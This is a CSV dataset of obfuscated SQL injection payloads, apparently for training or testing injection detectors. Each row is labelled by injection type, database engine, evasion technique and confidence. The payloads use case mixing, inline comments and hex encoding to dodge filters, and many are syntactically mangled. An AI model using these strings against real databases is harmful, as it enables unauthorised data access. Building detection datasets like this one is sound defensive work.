payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"3' OR : ( sElecT""'gBOI' wheRE 0x0X1058] LiKE 0x115F aND~0x0B0B114001601011=> ( seleCT COUnT >(} * ) <FRoM doMAIN.domAINS aS/*x^}?e*/T1,DOMaIn.COlumNs As<t0B10,DomaiN.tablEs/And trUE OR (SEleCt 0o0X0O0b111O0o0x0)?or ""KK}""!=""kk}"" Or'FALse OR falSe or 'D'<>'d' or FAlSe oR falsE And (SEleCT 0X197D)<>(seLECT (SEleCT 0x19E4)) aNd TRUE Or FAlsE?AND tRUE oR (SELEct (SELect (SELECT 0))) anD trUE OR False#aS T0X3: ) ) [oR 'wv(Z_Vyzh]",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"1' ) ) ) && rOw ( (SelecT 6237),(SELect 0x1D0b10D) ) > (' SElEct cOUnt ( * ) ,CoNCAT ( 0X0X6D8e79A0O0B1101011, ( SelECT ( ELt ( /**/0X185D LIKE 0x185d,(SELeCT?(Select 1)) ) ^ ) ) ,0X717A6x2FfA71,FLo Or ( *raND ( 4x0 )/n(S;I!@p(=q_2(A*/H*/ *(SeLEct (sElECT (SeleCt 0X2))) ` ) ) x fROM ( SELECT (SeLeCt 5292) UNion SElEcT (SElect (seLect 3785)) union seLeCt (sElEcT (sElEcT 3961)) UnIOn sElECt (sEleCt (SElEcT 7958)) ) @A GrOup bY x ) and < ( (\ =( 'eJUl' lIkE 'ejul",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
0o0b10'+ ( SELecT twyT WHeRe (SElEct;(SeLeCt/**/0xdf0b111)) LiKE/*p/jB*/(SELECT 3379) AnD `0x1e4c Like DBMs_UtIliTy.SQLId_To_sqlhaSh ( \ (/ chR ( (SelEct (sElecT (SElEcT 113))) ) OR $ chr ( (SelEct 0x0o0x47) )?'||cHR ( 0X0B0b1100110 ) Or cHR ;( 0B1102010 ) =||CHR (> (SeLecT (SeLeCt (seLeCT (SeLeCT (SeLECT (sElECt (sELECT (SELEcT 110)))))))) ) oR ( SeLECt ( Case wHen ( (SeleCt (seLeCT (SelEcT (sElect (SeLeCt 0x1E0X1C))))) LIke (seLeCt 0x1e4c) ) then_0x0|elSE+(SELect (selECT 0X0)) enD ) FROm DUaL ) ||chr ( (sElect 0O1455) ) or chR ( 0b0X0o0o0B1080110 ) ||chr (* 2o166&;) ?||cHR ( (selECT (sElECt (sEleCT 122))) ) or cHr ( 0X0O107 ) () ) ) +',error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"6o1""`;)@}<AS duVM&WHeRE}(SeLEcT&(SeLEcT{4X1E0B));}=_ 0B0X0X0O66bE/**/orDEr BY_9x0B100--",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' WHere 1XE1c LIKe (SElEcT 0Xe1C) && ( seLeCT (SElEcT (SElect (sElEct 0XBfb))) From ( seLECt cOUnT +( * ) ,CoNCAt ( 0x0O0b0X6D6E7aa0X0o57, ( $SelEct ( eLt ( 0X236b LiKE 0x236B,(SELect 0x1)= ) ) ) ,0x0O1315a0x7fFA6o0B0XF42af,flooR ( ranD ({:0x0 )( *(SElECT (sElECT$(sElect (SELECT (SELECT 2))))):% ) ) x froM INfOrmaTioN_scHEMa.CHARaCtEr_seTS grOuP By x( ) A ) oR FaLse oR FAlSe --",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
SeLecT ( CaSe WHen ( (SElect 2161) LIKE 0X80E8 ) TheN (SELEcT 2161) eLsE 0x0O1547* ( SeLeCT (seleCt (sElecT (SELECT 2164))) fRom mYsQL.Db ) END ) Or 0B0 or fALSe#+BrT,unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"6' Or EXtractvaLuE? ( 0X511,CoNcat ( 0X5c,0o2o0x0x5D6E7aA0x47, ( sELECt ( ELT ( <(SElEct:(SeLect (SeLecT (SElEcT 0x511)))) = 0x511,(selECT (SELECt (sElECt (sELeCt (sELECt (sElect 1)))))) <) ) { +) ,0x714a767a71' ) ) aNd 'yTLf' = 'YtLf",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1"" ANd ( SELeCt (SelECt (seLeCT (SeLEct (SeLECT (sElecT (SelecT (selecT (SElECt 2))))))))* ( if ( ( [ seLEct * FROm ( SELEcT concAT ( 0x0x6D6e7Aa71, ( sELeCt ( ELt ( 0xd9C liKe 4Xd9C,(seLeCt 0x0) ) ) ) ,0x717a467A71,0O0x78 )* ) S ) , (sElEcT 0X7532dCfb7657FFFa), (SELEcT 0O724766717586722426400) )& +) ) And ""tFok"" lIKe ""Tfok",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1:whERE-0b10001001000 LiKe (SelEcT-0X15E8) AnD eXtRacTvAluE ( \0x1f2C,cONcAt ( 4X2c,0x7161786a71, ( SELeCT % ( elt (& 0B1111120101110 \liKe 0B10X1f0x2E,(selECT (SeLECT`(SELECt 0x1))) ) ) ) ,0x0B2011001101A767A0O107 ) ; ): or FALsE AnD 0X9B10101310E NOt liKe (SeLect;2267) oR 0X0b0=Or FalSe oR FALSe OR FAlSe OR>(selEct 7631)!=0B1110111001111 or (sElECt (SELECt (SELECT 1))) Or fALsE and 1 or FAlSe --",error_based,mysql,case_variation|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"7' WHere$0x0o0C7b \liKE 0b0o0b11911011111411 Rlike/SlEeP;;(_'0X4 ? && 'trUE"" && 0X37b=0b1110009011` OR 0X0B0x0X1A13}nOt liKe (SeleCT 0X1a10) AnD/*T*/0o0X1&&'|WH'='|WH' aNd (sElecT (SElect (sElEcT 0x1b8a))) not. LiKe} (SeleCt&0x0o1B94) or[0x0x0 ? oR (sElECt (SElect (seLECT (seLecT 0X7e5)))) not lIKe+(seLEcT (sEleCT (SeLect 0x8E5)))AND& TRuE And~TruE or faLSE && TRUE OR False OR False#){*--oXTjZMB4itjo",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"5B1""anD$(SELecT+0B1107110201510) _=> Dbms_pIPE.rECEIvE_mEssAge (: ChR.;(\;0x2E+ ) Or chR *( (sElEct^(SEleCT (SELECT (SelECT (SelecT (sElect 0x0b0x4A)))))) )\/*:|(R */ oR {?Chr~ ( 0b3B3b110371001200101411101 )$~}or cHR/*;'z)*/ ('.(SelECT/(SELeCT (seleCt 0X41))) ) ,0B0O145 ')$@aNd 'A;'='a;'~/*0O0b0X0b0o10|\E_]*FM(z*!Fg oZ< H4bf]5E2I0O*/aNd 'e'='E';AND 'PY8'='pY5o0b1810' oR fALsE*-- KfqsIGN+QG.$zby?",time_blind,oracle,case_variation|comment_whitespace|inline_comment|scientific_notation,0.41,rule,sqliv5_json,unknown
"0b6%"" ) &)`` aND=UpdaTexml (` (sELEcT 8xD0x31),cOncAT) (+ 0b4b1X4x1X2E,0x0x4ee0x9FaA71, ([ sELECt }?( ~ELt ;(^ (SElecT (SelEcT (sEleCt 0Xd0O0x33))) LikE 0b0xd0O51,0b1o0x0B6=) . ) )* or (seLect (seLEct (SELECt (SELECT (SELECT (SELECT 0)))))) Or falsE#,0X3x7CDA0b1011111111a78 ) ,0X9X1E9: ) && ( ( ""%"" LikE ""W3cMT",error_based,mysql,case_variation|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"7X0O5O4',]+( .selECt! ( CAsE%wHen{ <({ 0o0o5X80a%like 2x96e9 :) ?TheN-:>( &selECt cOUnT$$(/*}T*\?ULJ;""UphhY9`(seLEcT|(sEleCT 0b0o0X4x8B0X0o0O7))|+ jzF2\G*/ * ) ` from*sysUSerS+as syS3X1,SYsUsErS\As sYs3O3,sYSUseRS~As<Sys1,SySusErS_as SYS4o0B0O0o5,sYsusErs/*"",'h\O/qA/eKvD UB!*/AS sYs9X5,SYsUSerS>As}SYS8O19,sySusERs<as%sYs6 &) {ElSE%(SelECT_0o2X0O0x0o4DA)* ( ;SeLEct](SELeCT (SELecT (SelECt 0b0X83a))) FRoM$master..SysDAtAbAseS ) [+eNd {_) ~)/*_BOQTgEjGlLik\f0o5OM0o7 */ ;",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"1%"" And_1x0O0X688/*Z4M""a4(X-siFb]*/ liKe bENChmARK ( 2x2C4B0X28,mD0B0X65 ( `0x2D457153 ) ) ~ && } TruE or""fAlse AND 'b' nOt LIKE 'b}' Or!(SeLECT 0xFFb) NOT lIKE 0XFfB oR 8x479 LIKE 7X478 and 0o0x18E7=(SELEct (SelEct (SElECt (SEleCt (sELecT (sELEcT (selECt (sElECt 0X19EB)))))))) Or falSe or 0X8 Or?(sElEct 0x24Be)/ LIke 0X24Bf$anD truE or (SEleCt (SelECt (selEct (SElECt/**/(seleCT (SELEcT 0))))))##m#T<5W",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"0O0o0b10""_wHeRe{(seLeCt (SEleCt.(sELEct (sElecT (SElecT<7x0x1dD9B815))))) ~=.+4x1E9o0o4o3b'aNd SlEEP ""("" 2X5 :) ) OR 'W'/**/LIke 'w/' aND,2X262b=(sELECT (SeLEcT](SEleCt 0X262B))) OR!?+""Lg"" lIkE ""LG+"" aND (seLEct (sEleCt:(SelECT 0X1))) OR]0x14fb nOT lIKE 0o5x0O16fB?--",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"7'}wHeRE (SeLECt 0X0B1111E2)+<LikE ?0b0x2666 and Elt ( 0o0xC2a LIkE^ (SelecT 0XC2A),SleEp ^( (sELECT 0x5) ) ` ) or FaLSe AND 0X13E8!=0B1001111101911'And (SeLECT (seLeCT (sELECT (selECT (sELEcT 1)))))#",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"7' OR ( seLEct 'FTEy'$WhEre 1X553,= 0O0x0O1051 AnD (( sEleCt (SELEct (selecT (selECt (SELeCt (sEleCt (SELect (SeleCt (seleCt (SeLeCt (SelECt (SelECT (SELECT (SELECT 2)))))))))))))* ( =If ( ;( < SELEcT * fROm ( |SElECT conCAt/*H, */<( <6o0X0O0x7171706a0B110b0x0b10b1000211, ( seleCt ( ELt ( 0XD9c OR ""?^* ""=""?^* H""#= 0Xd9C,0b1. AnD ) ]$ )^ ) ,0X0X8O1315A0X0b11101ba71,0x78 )+_ ) S ) ], (SelECt 0X8536605602C03e1a), (SELecT (seLECT 2x0b0O0x74aaC131Ba0EF0o2A))/ ) $ )& `/*5CY*/ ^) )/ ||('09L",unknown,nosql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.12,rule,sqliv5_json,string_single_quote
"sELEcT (] CASe WHen ( (SElecT 0O0O0b0x0o0o0o0x0B110B31) liKe} 0X9d0o30 ) ThEN 2b1 else 0B4b0xca0e203e4c04a6450a5e29ce0c40e7d24d5*?-( sELecT 1X0O1B0x1F FrOM MasteR..sySDATABASEs ): eNd ): and ;]'K' Not='KT' OR}FALse* Or faLSe && (SELECt (SELeCt (sELEcT 0B2x14D7))) lIKe (sELEct 0X0XED7) oR'""F"" NOT LIke ""F""+OR/*dd(FBO*/(SEleCT 0X0) or FALse or FalSE AND True --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"1' )% ) } && ExtracTValuE ]( (seLeCt 0X0f2E),ConCAT ( 0x4c,0x7131806a53, ;( SELEct ;(/**/ ElT ;(/*;o?Sp>DGtLh*(seLeCT (seLect 0x4))*/@8b0X1f2e LIKe (SElEct (sEleCT 0X6f2E)),0b0X6{ ) LIke] ) ) <,0B0X2X2e7a767a1O0B0X4X0o0O6B /**/ )!< ?) , AND ( )(. 'mWyU'='mwYu",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"4' wheRe 0O0X1f0x0b1000111 LIke 0x112d Or (seLeCt\(SeLecT 0O0b0x20E7)) lIkE ( seleCT CoUNt ?(& *'@)% FRom generAtE_seriEs ("" 0X1,(sElEcT 0X2dC6c0)/*t 0o0X8*rK=FZ8+?LiL|q);sZ0x2;e*/ )) + ) Or 0O0B11100121101=(selEcT (sElEct (sELeCt 1154))) || (SElect 0x105D)=0B0B0B0b1101000011001001010111110000111001001000111111100101011110001001100110100110011000100100001000110001101010001110001011101010001110 or ',{d&'*nOt?LIKE ',{D&'^Or+FAlsE && (sElEct 2724)<>(seLecT 2725) OR '_'<>'_' --E",heavy_query,postgresql,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"0X0o0O0b0B0O0x0X0o1' ) ;whErE|(SelECT (SElecT](SeLEct<(sElECt 0x1D9C))))( LIkE) (Select (SeleCt (SelecT (seLeCt (SELECT 0x502)))))>oR 0b10004011110101 =/**/ ( SelECT-COUnt (\/**/* ) froM gEnERaTe_seRiEs ( (selecT 0x1),(SELect 0X1e8480) !) . ) oR 0o10782 not in ((SelEct 0X124D),0b0x224e,(SElEcT.(seLEcT 0b11010010111))) anD ""d&"" !=/*fpg""PEV */""d&;"" or`' oR`"",V^"" NOT LIKE "",V^"" And 2x1e0o7d<>0b1111001111011 Or faLSe aND:truE Or/**/ FALSE aNd?(SeLeCT (SELeCt (seleCT (sELEct 0x1255))))!=0b0o11060 And""TRue aNd tRUE Or fAlSe And "" ;)'""="" ;)'"" OR False# O{' NOt`=%'#*o{' --g<JuVnbQ}0x18-z^e",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"2%' aNd 0b0x1e5c ; liKE DbMs_Utility.sQliD_TO_sqlhAsH |( ( chr (&!(SeLECt:0B0X0O3Xc0O2o13) ) oR cHr ( (seleCt,0X6e) ) or Chr aNd ""Y"" noT LiKe ""Y("" OR faLse ANd ""e""<>""E7""[Or False AnD '""' NoT lIkE '""e' Or (sElEcT 0x0) Or FaLSE AND TRue OR fALSe OR ""E`"" not liKE ""E`"" oR falSe or FAlsE aND TRuE AND trUE oR FALSE# ( (sEleCT (Select 7x40)) )) OR chr (^;4B1191084 <) ||ChR ( 8x71 ) oR:( ~SelEcT (;�Se when ( (SeLeCt 0x0B0o1e4C) =/*x)v6Jg`+7Qg*/ (SElecT 1x5e4C)+ ) then (SEleCt (seLeCT (SElECT 0x1))) else;8b0B0X0X0b0B1x0b0x0o0 ENd ) fROM:duaL ) Or CHR ( 0X57 ) OR CHR ( 0x0x1F ) ; Or CHR= ( (sELEct 0X393) ) !||cHr+ (]](Select (sELeCt/**/(seLEct (SEleCt (SelECt (SElect (SELeCt (SELEcT (seLEct (selEct 0XB5)))))))))) ) ||cHr ( 6X74 ) ) )[ *! && ; ;*'%'?= '%^=+ }(",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.11,rule,sqliv5_json,string_double_quote
"0B0O1 UNioN_ALL SElECT*NUll,nUll,nuLl,NuLL,nuLL,NuLl,nULl or""3b6B0O0B0X0b100001100110100114111O8!oR`0O0b1090X0X0o0*AnD TRUe aNd!9300 not[LIKe]9601=[|| fAlSe[{and ;trUe'or}0X21e4<>(sELeCT](SeLEcT/**/8676)) Or faLsE#T]31",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O0O0b0X0B8X6"" ) ) * aS fhlG wheRe (SElECt (SelEct 1204))=0b0x5e4 ANd 0xb25=CASt ( (} Chr ( (SelEct (sELect (Select 0x71))) ) oR-cHR ( (sEleCT (SeLEct 0x91)) )( or cHr ( (SELEcT;(SElEct;(SeLeCT 0X72))) ) < or/**/ ChR ( 0X6a: ) ||chR ( (sELEct (SeLeCt 113)) ) ) OR ( selEcT ( cAse:wHEN ( 8Xb0B18101 LIke 2XB25 ) thEn;(SeLeCt 0x1) else`0x7 end } ) ) ::tEXT Or ( chr ( +013 ) ||ChR ( 0x70 )- ||chr () 0X75 ) or chr ( 0x7A ) ||ChR/*QX|G0Or1o*/ ( (SeLeCt (seleCT (seLECt 113)))^ ) ) as NuMeriC ) oR(fAlSe OR fAlse and trUe AND TRue And trUe or (SElecT 0b0) OR FAlSe aND (SEleCT+(SElECt 0O3)) Or !fALse oR faLse'aNd (sELECt (SeleCT 0X1)) Or falSE && True# and TRue aND 0X24eE nOT&lIke (SELecT%(SeLeCT (sEleCT (SELeCt (sELecT 7B10010011101111))))) Or falSe aND tRUe or;falSe oR fAlSe=oR fAlsE aND 0o15137 != (selEcT 0X1A65)||FALSe --UC]RGmzp+B",unknown,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.06,rule,sqliv5_json,unknown
"0O1""And (sELEcT (SelecT (sElect 2xEF0))) = bENcHMArK [( 0x5a06E0B0,Md8 ( 4x26555642 ) ) + Or&FaLsE oR falsE or FalsE#;IGen",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' ). && (SeLEct 0X0O3E5C) ""= dbmS_uTiLiTy.SQLiD_to_sQlhasH ( ([ ChR &( {(sELEct (SELeCt (SELECT (SELECT 613))))\ ) Or cHr~ ( (SElect (seLEcT (SeLEcT (SELECt 113)))) $) oR CHR ( (SELECt (SeLeCT}(seLecT (seLecT (seLeCt 0Xb6))))) ) ||CHr ( 0b0x1a0 )-&||CHr[ ( (SElEct 0X71) ) Or ( seLECt ( casE WhEn& ( 0X1e2c=(SELECt 0o0b0x1e9C) () & THEn (sELEct 3x0o1)=eLSE 0X0 EnD () FroM DUAl ) Or chR ( (SelECt 0X71) ) ||chr ( (sElect (SeLEcT 0B1191610)) ) OR chr ( 5B1116110 ) oR cHR /*Iw?) N]MR~nl WS%cM$*/( (sElEcT (SElECt 0x7A))` ) OR CHr ( <(SELEct (Select (SeLEcT 0X71))) @ ) ) ) aNd ( 'LnTE' = 'LnTe",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"1,exP` ( ~ ( SeLECt * from ( :SElecT conCAt ( 0X0X777BBAa71, ( seLeCt ( eLT ( (SelecT 1x1e4f) Like (SeLEcT (SELect 0X9b1E0O9F)),0x0B0x1_ ); ) {) "",0X0B1011001101a0b1011111111A0o0B1101111,0X0O113 ) ( ) x ) ),",unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"2' ) aS mvaI WHErE@(seLeCt 0O0X167C)=(selecT (SEleCT (sELEcT (SELEcT 5456)))) ANd Exp ( ~ ( seLEcT * from ({ SeLECt CoNcAT /( 6X0x6d6e8AA77, ( selECt! ( eLT ( 0o0B0o0x1fFe\ LiKe &0X1FfE,(SelecT 3) /*d?k(rZixF*/ ) &)( /*sh){(SelECt 6)*/ ) ,0x0X0x2cDA0O0X591a71,0O0X0o116 ) ) ` x ) ) And TrUe aND tRue && (selECT (selECt (SELECT 1))) Or False Or fAlSe aNd tRUe anD (selEcT 1) || FaLSE AND tRuE ANd TRuE and 1 ANd TRuE --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ""\) [ )(!$:aS\sfan wHeRe 0b0X1d2B0X0xaC0X8Ea lIKE/*4;<U*/ 0x1X1c0O2+aNd (select 0x1E0B1011001)/|likE 8658",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"6""^ OR ! 1x0x24A0o10 liKE,lIKe^(+%'AbcDEfg',UPPer ( hEx ( R AnD OMBlOB (/*n)r\TD'y lgcf6*/ (SelEct (SElecT (SELect (sELect 0x1e14a4B1120116106))))/(seLEct (SelEcT (SEleCt (SELECT 0)))) ) ) | ) ?) anD ""mENM"" LIkE ""MenM",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ) /*(SeLEct (Select 2))?!(selEcT (selECt (SElECt 1)))]D j*/And`mAKe_set ( (SElEcT 0o10761) liKE% 9b0x9E55,(seLECT 0xADf) ) and ( 0B0b10000101000101} LIKE _~8517",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"9O9b9x0B1000O0X9x9B0o12b3o0o0x0o0b1001B0X6B4o5o13E9o3/*u]MMPIIGF7x0o0B0O9O11o9b0_mkW\l\oVRiP4iyN4x6[@F122YTB892ZJkJ!xmO]\0x6}$*//);|/UnIOn All(SeLECT)NUlL,NULl,NUlL,null,nULl,nULl,nuLL,nuLL,null--",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,unknown
"1' ) ) PRoCeDURe>ANaLysE ( EXtRAcTvaluE ;( (sEleCt (SELeCt (selECT (SEleCt (sEleCT (SELECT (SELECT 5847))))))),CoNcAt ( 0x5c,0B0X0x0o6D6e1Aa0x0X47, ( sElEcT (: cASE wHen ( (SeLeCT 0x16D0) liKe} 0x16D0 ) theN 0o0o3X5 eLSE 0X0,EnD ) ) _,0b0X0b0x717A0B1911111111a71> ) )/**/ ,(SElect (selEcT (seleCT (SeLect (SELECT 1))))) ~) And ? /*Xv|v$N:R8`4w?^i*/( ( 'WQMe'='wQme",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b1""{ ) ) ; ) And 1x7e4c like/p*/z~X4/6u*/ DBMs_utIlIty.sQLID_to_sqLHASh ( , ( ; chr ( (selECT (Select 113)) ). Or cHR. ( (SeLecT 113) ) OR CHr/*ya0X7DNR\ K4b\>0b411}&;tfCFMpY`i</?(selecT 3B0X5)S|-X!<+D /${ MDa_}I ,clkf k*/ ( 0x9O100 ) ||chr[ ( (seLeCt (SELect (sElEcT 0B1101011))) ) ||cHR ( (SeLEct (sElECt?0o0b1119071)) ) ||$ ( !sElECt ( CASe[whEN )( (sElecT 0x1C28) LIkE (seLEcT (SeleCT (seLecT!(sElect (SElECT (SelecT 8956)))))) ) tHeN (selECt (seLecT 5)) ELSE 0o0x0 enD ) FROM dUal! ) ||CHr; ( }(SeLect 0B1110111) ) oR ChR ( 0x0O0b114A ) oR CHr ( ~(seLECT (sElECT 0x76)) ) ||CHr ( 9X0x0o0O0x0x0X14A ?) ||chR =( ;(SELEct (SElECT 0B0X71)){ ) ) |/**/ ) aND ( ^ oR FAlse Or ~0X255D nOt LIKe (SElEcT;0x255d) AnD trUE oR (selEct 0x0) Or 9X0 and (SELECT (seLeCT 1))&&(SelECT (sELeCT (SElect (seLECT 1)))) And (SElECt:1758) nOt lIKe 1x6dF OR ""Xi""<>""XI"" OR falSe or (SeleCt 0) Or (SElect (selecT(0X421))!=(seleCT 3057) and ""K""=""K"" or FAlsE And 1 OR FaLsE oR FAlse OR 0 AnD "")Bb""!="")bB&""#(; ( +""KCXw"" = ""Kcxw0X6?0X0#dzXX-Ml' g|wp]pU",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,string_double_quote
1 RlIKe] ( seLect (: case wheN ( .4x1E2X9 lIKe 4X0B0x1e39 ) THeN (SELect (SElEct (SElEct (sELECT (sElect 0X8))))) eLSE 0X28 END ) ) ),unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O1'\?)[ Where/(sELECt*0O0XCbE)%[Like,_(sElEct.0o0O7O0X0O0o0b0b10000000001011000110001111011010111011000) UnION\aLL|sELeCT(NuLl,nUlL,nULl,nUlL,nuLl,nULl,NuLL,nuLl,nuLl,NUlL && }8o2Xf09 LiKE 0Xb21 oR FaLSEAnd(sELEct (SELEcT 0X1e0f))\]NOt LIKe *0X0b1E0B0B0X0B1111110010 aND$True$ANd ""]ko0B11""/*vmbI */Not=""]ko3="" or < falSe#ez.;tG]WB",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,unknown
"4"""" ) %as bUky$whERe`(selecT 0o0o47332) LIKe 0o0xb8e4 OR%(SELect 0xc0A)} LiKe ! !( >SelEcT COunT/**/ ( * ) From ALl_useRS T3x0o1,All_USerS t0x2,all_users t0O0o0B11,ALL_uSErs T4,ALl_UsErS t8 )[ ANd (SeLect (selECt (SeLeCt 1))) /**/ OR }(SELeCt (seLEct 0xD7E))=(SeLeCt (seLEct!(SeLeCT 3457))) && TRuE ANd tRue Or FAlSe oR (seLeCt 0)&&TRUE+--",unknown,nosql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.12,rule,sqliv5_json,unknown
"1, ) *;WherE (sElEcT 0x1E00) LIKe (seleCT 0xe60) and (sELECt 0o0B0x1E4c) ^= dBMs_UTIlITY.SqlId_TO_SQLhaSh ( ( cHr ( 0b0B0O0B0O0B1010110101111005011010011111101000101000101100000000101110110100011 ) ; OR chr ( 0b1110101 ) ||cHR ( 0X70 &) or/*\L0o10kjIl:~*/ CHr ( 0X6A )}/*Dl{pNClF0b1001101;G<ly^n Go]SbAXnM*/||chr ( (SELECT&(SELecT 0x2f))}]) or ( SElecT ( CAsE`when ( 0b0b10000001010101100510100011110110010051100 likE *(seLECt 0X1e4c)? ) TheN (sElECt (SelECT (SELecT (sELeCt (sELECT (selecT 1))))))!ElSe (seleCT (selEcT (SELecT 0)))^end ) fROm/*G{=*/dUAl ) '||CHr ( (Select 0B0b100111110) ) OR Chr ( 0B0B0B100001111001111100010 ) or CHr ( (SEleCt 178) &) OR CHR ( 0B0b0b1010110181111001011010100201010000001111101101000100111111001101010 ) &||Chr `(/**/ (selecT (SelecT (SElEct (selEcT (SElEct 193)))))] ) )] )^ OR (seLeCt (SeLEcT (sEleCt (SeLEct 0x742)))) NoT likE 0O0x0b0B11101000010*AnD 0x0b0B11100091001<>0o3412 && 0B10110111071 <> 0x4Ba AnD ]trUE AnD 0x1=Or FaLSE aNd truE ?Or. FALSe or fALSeaNdtRUe anD>(SelEct (SElecT`(sELEct 1))) anD TRUe or('Uq' LIKe$'Uq3' oR '3'<>'3' oR fALSE ANd tRue --",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"8%']= )* <<)[ :~"") ` OR 0B100x0O8b1010x0xa0B ;liKE&, >(( SElEct cOuNt' (;$* ) < fROm sYSUSErS/* <zz\coxbAnqP!(SeLECt 0B0o0x3E){u$ZKEZoHpU( r0""bzR0o5032qC~*/as syS0o5,sySUSeRS@as)SYs9,sYSUSErs AS<sYS0O5x5B111,SySUsERS as`SYS3O0O0x8,sYsUSERS aS;sYS0X5,sYSUSErs=aS{SYS0b0x0X3e0x8,sysuSers aS/Sys3/*LiM:fp^(sElect (SeLecT 0X6)) ;eb\+r>(SElecT 0x6)o];?*/ )* ? AnD< :(* ;^(^, (!]'%', NOT lIkE `""'",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
